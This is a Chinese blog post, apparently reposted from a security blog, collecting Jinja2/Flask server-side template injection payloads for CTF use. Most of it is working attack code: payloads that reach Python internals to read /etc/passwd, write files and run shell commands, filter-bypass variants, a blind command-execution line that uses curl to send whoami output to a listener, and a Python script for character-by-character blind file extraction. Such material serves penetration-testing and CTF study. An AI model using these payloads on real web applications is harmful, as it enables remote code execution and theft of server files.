> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.kanzhun.com](https://www.kanzhun.com/jiaocheng/597515.html)

转自 https://p0sec.net/index.php/archives/120/  
好长时间没更新过了，ssti 也不是新东西，打国赛半决赛，简直是 demo 全家桶，ssti 必然是遇到不少。很多东西只是保存在收藏栏里，用的时候再查很浪费时间，记录一下，遇到时也能顺手一点。

0x00 获取基本类
----------

首先通过 str、dict、tuple 或 list 获取 python 的基本类 (当然也可以利用一些其他在 jinja2 中存在的对象，比如 request)：

```
''.__class__.__mro__[2]
    {}.__class__.__bases__[0]
    ().__class__.__bases__[0]
    [].__class__.__bases__[0]
    request.__class__.__mro__[8]
```

可以借助__getitem__绕过中括号限制：

```
''.__class__.__mro__.__getitem__(2)
    {}.__class__.__bases__.__getitem__(0)
    ().__class__.__bases__.__getitem__(0)
    request.__class__.__mro__.__getitem__(8)
```

下面基本类就用 object 代替，测试时将 object 换成上面任意一个

0x01 文件操作
---------

object.__subclasses__()[40] 为 file 类，所以可以对文件进行操作

读文件：

```
object.__subclasses__()[40]('/etc/passwd').read()
```

写文件：

```
object.__subclasses__()[40]('/tmp').write('test')
```

0x02 执行命令
---------

object.__subclasses__()[59].init.func_globals.linecache 下直接有 os 类，可以直接执行命令：

```
object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
```

object.__subclasses__()[59].__init__.globals.__builtins__下有 eval，__import__等的全局函数，可以利用此来执行命令：

```
object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
object.__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

0x03 ByPass
-----------

分享一些 payload

过滤 [

读文件：

```
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
```

执行命令：

```
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
```

过滤引号

先获取 chr 函数，赋值给 chr，后面拼接字符串就好了：

```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}
```

借助 request 对象 (推荐)：

```
{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd
```

执行命令：

```
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
```

过滤双下划线__

{{‘’[request.args.class][request.args.mro][2]request.args.subclasses40.read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__  
4. 过滤 {{

可以利用 {%%} 标记

```
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
```

相当于盲命令执行，利用 curl 将执行结果带出来

如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来

```
{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %}~p0~{% endif %}
```

平时的 SQL 注入盲注脚本改一下就 ok

```
# -*- coding: utf-8 -*-
import requests


url = 'http://127.0.0.1:8080/'

def check(payload):
    postdata = {
        'exploit':payload
        }
    r = requests.post(url, data=postdata).content
    return '~p0~' in r

password  = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

for i in xrange(0,100):
    for c in s:
        payload = '{% if "".__class__.__mro__[2].__subclasses__()[40]("/tmp/test").read()['+str(i)+':'+str(i+1)+'] == "'+c+'" %}~p0~{% endif %}'
        if check(payload):
            password += c
            break
    print password
```

参考：

```
https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/
https://0day.work/jinja2-template-injection-filter-bypasses/
```